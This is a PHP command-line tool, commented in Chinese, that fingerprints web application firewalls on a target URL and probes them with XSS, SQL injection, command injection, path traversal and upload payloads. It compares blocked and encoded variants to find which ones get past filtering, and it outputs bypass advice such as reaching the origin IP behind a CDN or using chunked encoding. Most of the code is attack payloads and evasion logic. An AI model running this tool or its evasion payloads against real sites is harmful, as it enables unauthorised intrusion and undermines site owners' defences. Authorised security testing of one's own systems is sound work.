<?php
/**
 * WAF Detector - WAF/过滤器指纹识别工具
 * 检测目标应用的 WAF 和输入过滤机制
 *
 * Usage: php waf_detector.php <base_url> [cookie]
 * Output: JSON with WAF type and bypass recommendations
 */

class WafDetector {

    private string $baseUrl;
    private string $cookie;
    private array $results = [];

    public function __construct(string $baseUrl, string $cookie = '') {
        $this->baseUrl = rtrim($baseUrl, '/');
        $this->cookie = $cookie;
    }

    /**
     * 发送测试请求
     */
    private function probe(string $path, string $method = 'GET', ?string $body = null, array $headers = []): array {
        $ch = curl_init();
        $url = $this->baseUrl . $path;

        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HEADER => true,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_FOLLOWLOCATION => false,
            CURLOPT_HTTPHEADER => array_merge([
                'User-Agent: Mozilla/5.0 (audit)',
            ], $headers),
        ]);

        if ($this->cookie) {
            curl_setopt($ch, CURLOPT_COOKIE, $this->cookie);
        }

        if ($method === 'POST') {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        }

        $response = curl_exec($ch);
        if ($response === false) {
            $error = curl_error($ch);
            fwrite(STDERR, "[FATAL] curl request failed: {$error}\n");
            curl_close($ch);
            exit(1);
        }
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        $responseHeaders = substr($response, 0, $headerSize);
        $responseBody = substr($response, $headerSize);

        curl_close($ch);

        return [
            'status' => $httpCode,
            'headers' => $responseHeaders,
            'body' => $responseBody,
        ];
    }

    /**
     * 检测 WAF 类型
     */
    public function detectWaf(): array {
        // 基线请求
        $baseline = $this->probe('/');

        // WAF 触发 Payload
        $wafProbe = $this->probe("/?test=<script>alert(1)</script>&id=1' OR 1=1--");

        $wafType = 'none';
        $wafSignatures = [];

        $headers = strtolower($wafProbe['headers']);
        $body = strtolower($wafProbe['body']);

        // 检测已知 WAF 签名
        $signatures = [
            'cloudflare'    => ['server: cloudflare', 'cf-ray:'],
            'aws_waf'       => ['x-amzn-requestid', 'aws'],
            'modsecurity'   => ['mod_security', 'modsecurity', 'noyb'],
            'baota'         => ['bt-panel', '宝塔', 'btpanel'],
            'yunsuo'        => ['yunsuo', '云锁'],
            'safedog'       => ['safedog', '安全狗', 'waf/2.0'],
            'aliwaf'        => ['ali-cdn', 'aliyun'],
            'tencent_waf'   => ['tencent-waf', 'waf-tencent'],
            'nginx_waf'     => ['openresty', 'lua-resty-waf'],
            'wordfence'     => ['wordfence', 'wf-action'],
        ];

        foreach ($signatures as $name => $patterns) {
            foreach ($patterns as $pattern) {
                if (strpos($headers . $body, $pattern) !== false) {
                    $wafType = $name;
                    $wafSignatures[] = $pattern;
                }
            }
        }

        // 状态码分析
        if ($wafProbe['status'] === 403 && $baseline['status'] === 200) {
            $this->results['waf_blocking'] = true;
        }

        return [
            'waf_type' => $wafType,
            'signatures' => $wafSignatures,
            'blocking' => $wafProbe['status'] === 403,
            'baseline_status' => $baseline['status'],
            'probe_status' => $wafProbe['status'],
        ];
    }

    /**
     * 检测输入过滤机制
     */
    public function detectFilters(): array {
        $filters = [];

        // 测试 XSS 过滤
        $xssTests = [
            '<script>' => 'script_tag',
            '<img onerror=' => 'event_handler',
            'javascript:' => 'js_protocol',
            '<svg onload=' => 'svg_event',
        ];

        foreach ($xssTests as $payload => $name) {
            $resp = $this->probe('/?q=' . urlencode($payload));
            $filters['xss'][$name] = [
                'blocked' => ($resp['status'] === 403 || $resp['status'] === 400),
                'stripped' => (strpos($resp['body'], $payload) === false && $resp['status'] === 200),
                'encoded' => (strpos($resp['body'], htmlspecialchars($payload)) !== false),
            ];
        }

        // 测试 SQL 注入过滤
        $sqliTests = [
            "' OR 1=1--" => 'basic_sqli',
            "1 UNION SELECT" => 'union_select',
            "/*!50000SELECT*/" => 'mysql_comment',
        ];

        foreach ($sqliTests as $payload => $name) {
            $resp = $this->probe('/?id=' . urlencode($payload));
            $filters['sqli'][$name] = [
                'blocked' => ($resp['status'] === 403 || $resp['status'] === 400),
            ];
        }

        // 测试命令注入过滤
        $rceTests = [
            ';id' => 'semicolon',
            '|id' => 'pipe',
            '$(id)' => 'subshell',
        ];

        foreach ($rceTests as $payload => $name) {
            $resp = $this->probe('/?cmd=' . urlencode($payload));
            $filters['rce'][$name] = [
                'blocked' => ($resp['status'] === 403 || $resp['status'] === 400),
            ];
        }

        // 测试路径遍历过滤
        $lfiTests = [
            '../../../etc/passwd' => 'basic_traversal',
            '....//....//etc/passwd' => 'double_dot',
            '%2e%2e%2fetc%2fpasswd' => 'url_encoded',
        ];

        foreach ($lfiTests as $payload => $name) {
            $resp = $this->probe('/?file=' . urlencode($payload));
            $filters['lfi'][$name] = [
                'blocked' => ($resp['status'] === 403 || $resp['status'] === 400),
            ];
        }

        return $filters;
    }

    /**
     * 生成绕过建议
     */
    public function getBypassRecommendations(array $wafInfo, array $filterInfo): array {
        $recommendations = [];

        $bypassStrategies = [
            'cloudflare' => [
                '使用 Unicode 编码绕过',
                '利用 Cloudflare 缓存规则差异',
                '通过源站 IP 直接访问（绕过 CDN）',
                '分块传输编码（chunked）绕过',
            ],
            'modsecurity' => [
                '使用 MySQL 内联注释 /*!50000.../*/',
                '使用 HPP（HTTP Parameter Pollution）',
                '利用 Content-Type 解析差异',
                '使用多行注释嵌套',
            ],
            'baota' => [
                '使用 URL 编码变体',
                '利用 Nginx 解析差异',
                '使用分块请求',
                'HTTP 方法覆盖（X-HTTP-Method-Override）',
            ],
            'none' => [
                '无 WAF 检测到，可直接测试',
                '仍需注意应用层过滤',
            ],
        ];

        $wafType = $wafInfo['waf_type'];
        $recommendations['waf_bypass'] = $bypassStrategies[$wafType] ?? $bypassStrategies['none'];

        // 基于过滤检测的建议
        if (isset($filterInfo['xss'])) {
            $allBlocked = true;
            foreach ($filterInfo['xss'] as $test) {
                if (!$test['blocked'] && !$test['stripped']) $allBlocked = false;
            }
            if (!$allBlocked) {
                $recommendations['xss'] = '部分 XSS 向量未被过滤，尝试未被检测的 Payload';
            }
        }

        return $recommendations;
    }

    /**
     * 按漏洞类型深度探测 - 对比正常 Payload 与绕过 Payload 的响应差异
     * 用于判断 WAF 是否能被特定编码/变体绕过
     */
    public function probeByVulnType(): array {
        $probeResults = [];

        // --- SQLi probing ---
        $sqliNormal = $this->probe('/?id=' . urlencode("' OR 1=1--"));
        $sqliBypass = $this->probe('/?id=' . urlencode("&#x55;NION SELECT 1,2,3"));
        $sqliUnicode = $this->probe('/?id=' . urlencode("' /*!50000OR*/ 1=1--"));
        $sqliDouble = $this->probe('/?id=' . urlencode("' %4fR 1=1--"));
        $probeResults['sqli'] = [
            'normal_payload' => "' OR 1=1--",
            'normal_status' => $sqliNormal['status'],
            'normal_body_length' => strlen($sqliNormal['body']),
            'bypass_payload' => '&#x55;NION SELECT 1,2,3',
            'bypass_status' => $sqliBypass['status'],
            'bypass_body_length' => strlen($sqliBypass['body']),
            'unicode_payload' => "' /*!50000OR*/ 1=1--",
            'unicode_status' => $sqliUnicode['status'],
            'double_encode_status' => $sqliDouble['status'],
            'bypass_possible' => ($sqliNormal['status'] !== $sqliBypass['status']),
            'unicode_bypass_possible' => ($sqliNormal['status'] !== $sqliUnicode['status']),
        ];

        // --- XSS probing ---
        $xssNormal = $this->probe('/?q=' . urlencode('<script>alert(1)</script>'));
        $xssBypass = $this->probe('/?q=' . urlencode('<ſcript>alert(1)</ſcript>'));
        $xssSvg = $this->probe('/?q=' . urlencode('<svg/onload=alert(1)>'));
        $xssImg = $this->probe('/?q=' . urlencode('<img src=x onerror=alert(1)>'));
        $xssEncoded = $this->probe('/?q=' . urlencode('%3Cscript%3Ealert(1)%3C/script%3E'));
        $probeResults['xss'] = [
            'normal_payload' => '<script>alert(1)</script>',
            'normal_status' => $xssNormal['status'],
            'normal_body_length' => strlen($xssNormal['body']),
            'bypass_payload' => '<ſcript>alert(1)</ſcript>',
            'bypass_status' => $xssBypass['status'],
            'bypass_body_length' => strlen($xssBypass['body']),
            'svg_status' => $xssSvg['status'],
            'img_onerror_status' => $xssImg['status'],
            'double_encode_status' => $xssEncoded['status'],
            'bypass_possible' => ($xssNormal['status'] !== $xssBypass['status']),
            'svg_bypass_possible' => ($xssNormal['status'] !== $xssSvg['status']),
        ];

        // --- Command injection probing ---
        $cmdNormal = $this->probe('/?cmd=' . urlencode(';id'));
        $cmdBypass = $this->probe('/?cmd=' . urlencode('${IFS}id'));
        $cmdNewline = $this->probe('/?cmd=' . urlencode("\nid"));
        $cmdTick = $this->probe('/?cmd=' . urlencode('`id`'));
        $probeResults['command_injection'] = [
            'normal_payload' => ';id',
            'normal_status' => $cmdNormal['status'],
            'normal_body_length' => strlen($cmdNormal['body']),
            'bypass_payload' => '${IFS}id',
            'bypass_status' => $cmdBypass['status'],
            'bypass_body_length' => strlen($cmdBypass['body']),
            'newline_status' => $cmdNewline['status'],
            'backtick_status' => $cmdTick['status'],
            'bypass_possible' => ($cmdNormal['status'] !== $cmdBypass['status']),
            'newline_bypass_possible' => ($cmdNormal['status'] !== $cmdNewline['status']),
        ];

        // --- File upload Content-Type probing ---
        $uploadTests = [];
        $contentTypes = [
            'application/php' => 'php_type',
            'image/png' => 'image_type',
            'application/octet-stream' => 'octet_stream',
            'image/gif' => 'gif_type',
            'text/plain' => 'text_plain',
        ];
        foreach ($contentTypes as $ct => $label) {
            $resp = $this->probe('/upload', 'POST', 'test_content', [
                'Content-Type: multipart/form-data; boundary=----test',
                'X-Content-Type: ' . $ct,
            ]);
            $uploadTests[$label] = [
                'content_type' => $ct,
                'status' => $resp['status'],
            ];
        }
        $probeResults['file_upload'] = [
            'description' => 'Content-Type variation tests for file upload endpoints',
            'results' => $uploadTests,
            'type_bypass_possible' => (
                isset($uploadTests['php_type']['status'], $uploadTests['image_type']['status']) &&
                $uploadTests['php_type']['status'] !== $uploadTests['image_type']['status']
            ),
        ];

        // --- Path traversal probing ---
        $travNormal = $this->probe('/?file=' . urlencode('../../../etc/passwd'));
        $travBypass = $this->probe('/?file=' . urlencode('%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'));
        $travDouble = $this->probe('/?file=' . urlencode('....//....//....//etc/passwd'));
        $travUtf8 = $this->probe('/?file=' . urlencode('..%c0%af..%c0%afetc/passwd'));
        $probeResults['path_traversal'] = [
            'normal_payload' => '../../../etc/passwd',
            'normal_status' => $travNormal['status'],
            'normal_body_length' => strlen($travNormal['body']),
            'bypass_payload' => '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            'bypass_status' => $travBypass['status'],
            'bypass_body_length' => strlen($travBypass['body']),
            'double_dot_status' => $travDouble['status'],
            'utf8_overlong_status' => $travUtf8['status'],
            'bypass_possible' => ($travNormal['status'] !== $travBypass['status']),
            'double_dot_bypass_possible' => ($travNormal['status'] !== $travDouble['status']),
        ];

        return $probeResults;
    }

    /**
     * 完整检测流程
     */
    public function fullScan(): array {
        $wafInfo = $this->detectWaf();
        $filterInfo = $this->detectFilters();
        $vulnProbes = $this->probeByVulnType();
        $recommendations = $this->getBypassRecommendations($wafInfo, $filterInfo);

        return [
            'waf' => $wafInfo,
            'filters' => $filterInfo,
            'vuln_type_probes' => $vulnProbes,
            'recommendations' => $recommendations,
        ];
    }
}

// CLI 入口
if (php_sapi_name() === 'cli' && isset($argv[1])) {
    $baseUrl = $argv[1];
    $cookie = $argv[2] ?? '';

    $detector = new WafDetector($baseUrl, $cookie);
    $result = $detector->fullScan();

    echo json_encode($result, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n";
}
